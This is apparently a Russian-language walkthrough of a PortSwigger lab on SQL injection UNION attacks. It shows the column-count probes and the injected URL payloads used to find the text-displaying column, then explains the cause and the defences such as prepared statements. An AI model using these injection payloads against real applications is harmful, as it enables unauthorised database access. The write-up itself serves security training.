# 📘 PortSwigger Lab: SQL injection UNION attack, finding a column containing text

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

---

# 📑 Оглавление

- [🎯 Цель](#goal)
- [🧠 Идея атаки](#idea)
- [🏗 Что уже известно](#how)
- [🔍 Шаг 1 — Поиск количества колонок](#step1)
- [🔍 Шаг 2 — Поиск string column](#step2)
- [🔍 Шаг 3 — Успешный payload](#step3)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Найти колонку, которая:
- принимает string values;
- отображается на странице.

---

<a id="idea"></a>

# 🧠 Идея атаки

`UNION SELECT` позволяет добавлять собственные данные в результат SQL-запроса.

Наша задача:
- заставить приложение показать:
```text
jEa1F5
```

---

<a id="how"></a>

# 🏗 Что уже известно

Из предыдущей лабы:

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Работает

Это означает:
# SELECT содержит 3 колонки.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Поиск количества колонок

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL,NULL--
```

✅ Success

---

# Вывод

Количество колонок:
# 3

---

<a id="step2"></a>

# 🔍 Шаг 2 — Поиск string column

Теперь нужно найти колонку,
которая принимает text values.

---

# Проверяем первую колонку

```http
/filter?category=Accessories' UNION SELECT 'jEa1F5',NULL,NULL--
```

❌ Строка не появилась

---

# Проверяем вторую колонку

```http
/filter?category=Accessories' UNION SELECT NULL,'jEa1F5',NULL--
```

✅ Строка появилась

---

# Проверяем третью колонку

```http
/filter?category=Accessories' UNION SELECT NULL,NULL,'jEa1F5'--
```

❌ Строка не появилась

---

# Вывод

Вторая колонка:
- string-compatible;
- visible в response.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Успешный payload

Финальный payload:

```http
/filter?category=Accessories' UNION SELECT NULL,'jEa1F5',NULL--
```

---

# Как выглядит SQL

```sql
SELECT name,description,price FROM products
WHERE category='Accessories'
UNION SELECT NULL,'jEa1F5',NULL--'
```

---

# Что произошло

Приложение показало:

```text
jEa1F5
```

Лаба была засчитана.

---

<a id="why"></a>

# 💥 Почему атака сработала

Потому что приложение:
- вставляло input напрямую в SQL;
- не использовало prepared statements;
- отображало SQL results пользователю.

---

<a id="defense"></a>

# 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Безопасный пример:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Чеклист

- [ ] найден SQL Injection
- [ ] найдено количество колонок
- [ ] найден visible column
- [ ] найден string-compatible datatype
- [ ] выведены собственные данные

---

# ⬆ Наверх

[Вернуться к началу](#top)
